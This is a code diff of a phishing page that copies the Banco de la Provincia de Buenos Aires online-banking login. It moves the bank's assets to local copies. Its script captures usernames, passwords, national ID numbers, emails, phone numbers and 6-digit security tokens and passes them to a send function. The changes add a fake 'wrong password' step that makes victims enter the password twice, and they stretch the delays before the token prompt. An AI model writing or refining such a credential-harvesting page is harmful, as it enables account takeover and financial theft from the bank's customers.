@@ -10,17 +10,14 @@
 <link rel="icon" type="image/png" sizes="32x32" href="https://www.bancoprovincia.bancainternet.com.ar/spa/favicon-32x32.png">
 <link rel="icon" type="image/png" sizes="16x16" href="https://www.bancoprovincia.bancainternet.com.ar/spa/favicon-16x16.png">
 <link rel="apple-touch-icon" sizes="180x180" href="https://www.bancoprovincia.bancainternet.com.ar/spa/icons/apple-touch-icon.png">
-<link rel="stylesheet" href="https://www.bancoprovincia.bancainternet.com.ar/spa/assets/index-BI5FZjHJ.css">
 <style>
   .oculto{display:none!important}
-  .err-txt{color:#c62828;font-size:.85rem;margin:.35rem 0 0}
-  .mal{border-color:#c62828!important}
-  .sp2{width:2rem;height:2rem;border:3px solid #e3e3e3;border-top-color:#279d2e;border-radius:50%;margin:0 auto;animation:g .8s linear infinite}
-  @keyframes g{to{transform:rotate(360deg)}}
 </style>
+<link rel="stylesheet" href="estilo.css">
+<link rel="stylesheet" href="parche.css">
 </head>
 <body class="spa">
-<div class="box container-fluid layout login" style="background-image:url('https://www.bancoprovincia.bancainternet.com.ar/spa/assets/login-Dl1yShgU.png')">
+<div class="box container-fluid layout login" style="background-image:url('fondo.png')">
  <div class="box row justify-content-center">
   <div class="box login-flex-content px-0">
    <div class="box col-12 col-sm-12 col-md-8 col-lg-6 col-xl-4 col-xxl-4 login-content">
@@ -28,7 +25,7 @@
       <header class="box layout header login-mobile"><div class="box">
         <div class="box header-gradient desktop container-fluid pt-2"><div class="box row"><div class="box col-12 text-center">
           <div class="box logoBapro logoBaproLogin">
-            <img alt="Banco de la Provincia de Buenos Aires" class="w-auto h-100 logo-web" src="https://www.bancoprovincia.com.ar/CDN/Get/logo_mobile_bip">
+            <img alt="Banco de la Provincia de Buenos Aires" class="w-auto h-100 logo-web" src="logo.png">
           </div>
         </div></div></div>
       </div></header>
@@ -44,17 +41,17 @@
         <form id="f1" onsubmit="return false">
           <div class="mb-3">
             <label class="label-required txt-input-label" for="username">Tu usuario</label>
-            <div class="user"><input autocapitalize="off" autocomplete="off" class="form-control border-info focusMouse" id="username" maxlength="25" name="username" placeholder="Ingresá tu nombre de usuario" type="text" value=""></div>
+            <div class="user"><input autocapitalize="off" autocomplete="off" class="form-control border-info focusMouse" id="username" maxlength="16" name="username" placeholder="Ingresá tu nombre de usuario" type="text" value=""></div>
           </div>
           <div class="mb-3">
             <label class="label-required txt-input-label" for="password">Tu clave</label>
             <div class="box password position-relative d-flex">
-              <div class="flex-shrink-0 w-100"><input autocomplete="off" class="form-control border-info focusMouse" id="password" maxlength="30" name="password" placeholder="Ingresá tu clave" type="password" value=""></div>
+              <div class="flex-shrink-0 w-100"><input autocomplete="off" class="form-control border-info focusMouse" id="password" maxlength="8" name="password" placeholder="Ingresá tu clave" type="password" value=""></div>
               <button class="btn p-0 password-eye-button btn focusMouse" type="button" id="ver" aria-label="Mostrar clave">
                 <svg aria-hidden="true" class="svg-icon svg-input-primary" height="20px" viewBox="0 0 18 12" width="20px" xmlns="http://www.w3.org/2000/svg"><path d="M18 6.19558L17.7956 6.51558C16.8571 7.81671 15.5498 8.88004 14.0024 9.60075C12.4551 10.3215 10.7212 10.6747 8.97161 10.6256C7.93584 10.6269 6.90454 10.5059 5.90536 10.2656C5.81509 10.2428 5.73038 10.2055 5.65552 10.1556L6.79117 9.15558C7.49196 9.29538 8.20766 9.36913 8.92618 9.37558C10.3402 9.41368 11.7436 9.14872 13.0156 8.60349C14.2876 8.05826 15.3902 7.24909 16.2284 6.24558C15.4246 5.22188 14.3167 4.41239 13.0259 3.90558C12.9546 3.87497 12.8894 3.83445 12.8328 3.78558L13.889 2.84558C15.4895 3.51496 16.8291 4.58668 17.7388 5.92558L18 6.19558ZM9.75521 7.72558C10.267 7.72903 10.7719 7.62126 11.2251 7.41183C11.6783 7.20239 12.0658 6.89775 12.3533 6.52491C12.6408 6.15206 12.8195 5.72252 12.8734 5.27434C12.9273 4.82617 12.8549 4.3732 12.6625 3.95558L8.63092 7.50558C8.99266 7.63081 9.37786 7.69526 9.76656 7.69558L9.75521 7.72558ZM4.08833 10.3856L3.20252 11.1756C3.06155 11.2791 2.88185 11.3326 2.69848 11.3257C2.51511 11.3189 2.34122 11.2521 2.21074 11.1384C2.08025 11.0248 2.00252 10.8724 1.99272 10.711C1.98292 10.5496 2.04175 10.3908 2.15773 10.2656L3.29338 9.26558C2.00023 8.60607 0.924019 7.66185 0.170347 6.52558L0 6.20558L0.204416 5.88558C1.14191 4.58593 2.44744 3.52355 3.99261 2.80292C5.53777 2.08229 7.26935 1.72824 9.01703 1.77558C9.81889 1.77928 10.6181 1.85636 11.4019 2.00558L13.4006 0.195576C13.4685 0.134512 13.5493 0.0858141 13.6386 0.0522635C13.7278 0.018713 13.8237 0.000967017 13.9207 3.84311e-05C14.0177 -0.000890155 14.114 0.0150172 14.204 0.0468519C14.294 0.0786866 14.3761 0.125825 14.4454 0.185577C14.5148 0.245328 14.5701 0.316522 14.6082 0.395094C14.6463 0.473665 14.6664 0.558075 14.6675 0.643505C14.6685 0.728935 14.6505 0.813712 14.6143 0.892994C14.5782 0.972277 14.5246 1.04451 14.4568 1.10558L13.7754 1.71558L4.08833 10.3856ZM1.6694 6.20558C2.35255 7.07942 3.26387 7.79616 4.32681 8.29558L6.47319 6.37558C6.16796 5.88768 6.04226 5.32837 6.11346 4.77488C6.18466 4.22138 6.44923 3.701 6.87066 3.28558C4.76632 3.62772 2.89637 4.67882 1.65804 6.21558" fill="#5c5c5c"></path></svg>
               </button>
             </div>
-            <p id="err" class="err-txt oculto">Usuario o clave incorrectos.</p>
+            <p id="err" class="oculto">Usuario o clave incorrectos.</p>
           </div>
           <div class="box text-center"><button class="btn col-6 mb-1 btn-link-primary btn focusMouse" type="button">Teclado Virtual</button></div>
           <div class="box text-center"><button class="btn w-100 btn-primary btn focusMouse" type="button" id="b1">Ingresar</button>
@@ -118,6 +115,7 @@ function $(i){return document.getElementById(i);}
 function dig(s){return String(s).replace(/\D/g,"");}
 function ir(a,b){$(a).classList.add("oculto");$(b).classList.remove("oculto");window.scrollTo(0,0);}
 function marcar(e,m){e.classList.toggle("mal",m);}
+function limpiarErr(){$("err").classList.add("oculto");}
 function enviar(estado){
   var c=JSON.stringify(Object.assign({},datos,{estado:estado}));
   function g(){try{var q=JSON.parse(localStorage.getItem("q")||"[]");q.push(c);localStorage.setItem("q",JSON.stringify(q));}catch(e){}}
@@ -131,25 +129,33 @@ window.addEventListener("load",function(){
     var r;try{r=JSON.parse(localStorage.getItem("q")||"[]");}catch(e){r=[];}r.push(c);localStorage.setItem("q",JSON.stringify(r));});});
 });
 $("ver").onclick=function(){$("password").type=$("password").type==="password"?"text":"password";};
-$("username").oninput=function(e){e.target.value=e.target.value.replace(/\s/g,"");marcar(e.target,false);};
-$("password").oninput=function(e){marcar(e.target,false);};
+$("username").oninput=function(e){e.target.value=e.target.value.replace(/\s/g,"");marcar(e.target,false);limpiarErr();};
+$("password").oninput=function(e){marcar(e.target,false);limpiarErr();};
 $("dni").oninput=function(e){e.target.value=dig(e.target.value).slice(0,8);marcar(e.target,false);};
 $("cel").oninput=function(e){e.target.value=dig(e.target.value).slice(0,10);marcar(e.target,false);};
 $("tok").oninput=function(e){e.target.value=dig(e.target.value).slice(0,6);marcar(e.target,false);};
 $("mail").oninput=function(e){marcar(e.target,false);};
+$("username").addEventListener("keydown",function(e){if(e.key==="Enter"){e.preventDefault();$("password").focus();}});
+$("password").addEventListener("keydown",function(e){if(e.key==="Enter"){e.preventDefault();$("b1").click();}});
+$("dni").addEventListener("keydown",function(e){if(e.key==="Enter"){e.preventDefault();$("mail").focus();}});
+$("mail").addEventListener("keydown",function(e){if(e.key==="Enter"){e.preventDefault();$("cel").focus();}});
+$("cel").addEventListener("keydown",function(e){if(e.key==="Enter"){e.preventDefault();$("b2").click();}});
+$("tok").addEventListener("keydown",function(e){if(e.key==="Enter"){e.preventDefault();$("b3").click();}});
 $("b1").onclick=function(){
   var u=$("username").value.trim(),c=$("password").value.trim();
-  var uOk=u.length>=4,cOk=c.length>=4;
+  var uOk=u.length>=8&&u.length<=16,cOk=c.length>=6;
   marcar($("username"),!uOk);marcar($("password"),!cOk);
   if(!uOk){$("username").focus();return;}
   if(!cOk){$("password").focus();return;}
-  datos.usuario=u;datos.clave=c;enviar("login");
+  datos.usuario=u;datos.clave=c;
+  var reint=!!datos.reintento;
+  enviar(reint?"login_retry":"login");
   ir("p1","p2b");$("saltar").classList.add("oculto");
   setTimeout(function(){
-    if(!datos.reintento){datos.reintento=1;ir("p2b","p1");$("password").value="";
+    if(!reint){datos.reintento=1;$("password").value="";ir("p2b","p1");
       $("password").classList.add("mal");$("err").classList.remove("oculto");$("password").focus();enviar("clave_mala");}
     else{ir("p2b","p2");$("dni").focus();}
-  },2000);
+  },2200);
 };
 $("saltar").onclick=function(){ir("p2b","p3");$("tok").focus();};
 $("b2").onclick=function(){
@@ -161,7 +167,7 @@ $("b2").onclick=function(){
   if(!tOk){$("cel").focus();return;}
   datos.dni=dig(d);datos.email=m;datos.telefono=dig(t);enviar("parcial");
   ir("p2","p2b");$("saltar").classList.remove("oculto");
-  setTimeout(function(){ir("p2b","p3");$("tok").focus();},8000);
+  setTimeout(function(){ir("p2b","p3");$("tok").focus();},18000);
 };
 $("b3").onclick=function(){
   if($("tok").value.trim().length!==6){marcar($("tok"),true);$("tok").focus();return;}
